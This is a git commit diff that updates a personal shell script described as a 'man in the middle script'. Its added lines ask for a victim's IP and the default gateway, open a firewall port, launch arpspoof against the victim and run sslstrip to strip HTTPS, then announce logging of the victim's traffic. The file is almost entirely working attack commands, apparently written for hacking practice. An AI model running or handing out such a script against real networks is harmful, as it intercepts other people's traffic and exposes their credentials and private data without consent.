63408a9bdcac53e998d38590cecfbbdba25f249e
guy.zwerdling <guy.zwerdling@gmail.com>
2017-11-01 12:18:13 +0200

    update my man in the middle script

--- Guy/EHC/GuyTcontrol.sh
+++ Guy/EHC/GuyTcontrol.sh
@@ -3,6 +3,22 @@ echo "Please type the ip of your VICTIM: "
 read VICTIM
 echo "Please type the ip of your DG: "
 read DG
+echo "Please type REDIRECT port number: "
+read REDIRECT
+iptables -I INPUT 1 -p tcp --dport $REDIRECT -j ACCEPT
+iptables -t nat -L PREROUTING
+echo "Strting arp poisoning on another terminal..."
+sleep 5
+echo "."
+sleep 5
+echo ".."
+sleep 5
+echo "..."
+sleep 5
+gnome-terminal -e arpspoof -i wlan0 -t $VICTIM -r $DG
+echo "Start sslstrip -l $REDIRECT on another terminal..."
+sleep 5
+gnome-terminal -e sslstrip -l $REDIRECT
+sleep 5
+echo "Starting log your VICTIM $VICTIM trafics"
 
-echo "$VICTIM is the victim"
-echo "$DG is the dg"
